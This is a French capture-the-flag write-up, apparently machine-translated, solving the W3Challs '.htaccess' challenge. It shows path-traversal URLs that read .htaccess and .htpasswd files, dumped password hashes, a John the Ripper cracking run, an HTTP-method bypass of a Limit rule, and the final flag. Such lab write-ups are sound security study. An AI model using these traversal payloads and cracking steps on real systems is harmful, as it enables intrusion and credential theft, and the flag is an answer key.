# .htaccess

1. Tout d’abord, passons par le site et affichons la source sur le référentiel git.
2. Ensuite, nous pouvons lire le README.md et voir que nous devons changer de chemin. La chose la plus importante est que le nom du chemin "secret" est changé, de sorte que la première mission est maintenant de trouver le nom caché. 
3. Maintenant, nous sommes en mesure de savoir que nous sommes dans la direction "inc" et après avoir lu "index.php".
    ```
    <?php

    require_once __DIR__.'/inc/top.php';

    if (isset($_GET['page']) && is_string($_GET['page']))
    {
        $page = __DIR__.'/inc/'.$_GET['page'];

        if (!file_exists($page))
        {
            printf('<div class="error">This page doesn\'t exist!</div>');
            exit();
        }

        require_once $page;
    }
    else
        require_once __DIR__.'/inc/home.php';

    require_once __DIR__.'/inc/footer.php';

    ?>
    ```
    Nous savons que nous devons traval le fichier par l’url "http://htaccess.hax.w3challs.com/index.php?page=". Maintenant, nous sommes capables de voyager et nous passons d’abord par la direction "http://htaccess.hax.w3challs.com/index.php?page=../admin/.htaccess". Voici les données que nous obtenons : 
    ```
    AuthUserFile /home/htaccess/www/UlTr4_S3cR3T_p4Th/.htpasswd AuthGroupFile /dev/null AuthName "Private area" AuthType Basic require valid-user
    ```
    La chose la plus importante est que nous obtenons le nom du fichier "secret" "UlTr4_S3cR3T_p4Th". 
4. Maintenant, nous sommes en mesure d’obtenir plus d’informations par "http://htaccess.hax.w3challs.com/index.php?page=../UlTr4_S3cR3T_p4Th/.htpasswd" et voici les données que nous obtenons : 
    ```
    admin1:$apr1$Ikl22aeJ$w1uWlBGlbatPnETT2XGx.. 
    admin2:$apr1$yJnQGpTi$WF5eCC/8lKsgBKY7fvag60 
    admin3:$apr1$fN20xzIa$UAnYxYS8qRiO8WKPJwOlK1 
    admin4:zQMI5ehC.sED2 
    admin5:{SHA}CKVCPg9EZI8U9KPPakEXgfXrMIc= 
    superadmin:{SHA}pAsyOzA/MHasbNO0OKRuXSp5sRI=
    ```
    Après avoir obtenu l’information, la première chose que je fais est d’utiliser john the ripper pour déchiffrer le code et j’obtiens :
    ```
    Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
    Use the "--format=md5crypt-long" option to force loading these as that type instead
    Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-opencl"
    Use the "--format=md5crypt-opencl" option to force loading these as that type instead
    Using default input encoding: UTF-8
    Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 SSE4.1 4x5])
    Proceeding with single, rules:Single
    Press 'q' or Ctrl-C to abort, almost any other key for status
    Almost done: Processing the remaining buffered candidate passwords, if any.
    Proceeding with wordlist:/usr/local/Cellar/john-jumbo/1.9.0/share/john/password.lst, rules:Wordlist
    orange           (?)
    1g 0:00:00:00 DONE 2/3 (2020-02-02 17:22) 100.0g/s 14000p/s 14000c/s 14000C/s brian..skippy
    Use the "--show" option to display all of the cracked passwords reliably
    Session completed
    ```
    Ainsi, nous connaissons le nom d’utilisateur : admin1 et le mot de passe : orange. Maintenant, connectons-nous « http://htaccess.hax.w3challs.com/admin/ » et obtenons la première partie du flag.
5. Ensuite, nous devons nous connecter superadmin pour obtenir la deuxième partie du drapeau. Après les tons de craquement du temps "{SHA}pAsyOzA/MHasbNO0OKRuXSp5sRI=", Je découvre qu’il est impossible de le craquer. Puits... peut-être dix ans mais je n’ai pas le temps ! Donc, je cherche une autre façon de le passer. J’ai lu plus près de la "superadmin/.htaccess" fichier : 
    ```
    AuthUserFile /var/www/secret/.htpasswd_super
    AuthGroupFile /dev/null
    AuthName "Private area - superadmin only"
    AuthType Basic

    <Limit GET POST>
        require valid-user
    </Limit>
    ```
    Regardons de plus près la partie "Limit", et voici quelques-uns [information](https://defendtheweb.net/discussion/1159-bypassing-htaccesshtpasswd-based-authentication) que je trouve sur le site. Maintenant, nous sommes en mesure de le passer en changeant la méthode en utilisant l’url "http://htaccess.hax.w3challs.com/superadmin/index.php" et obtenez la deuxième partie du flag.
**6. Voici le flag :** `W3C{__0hMyG0d_Th3yKi7l3dk3nNy}`
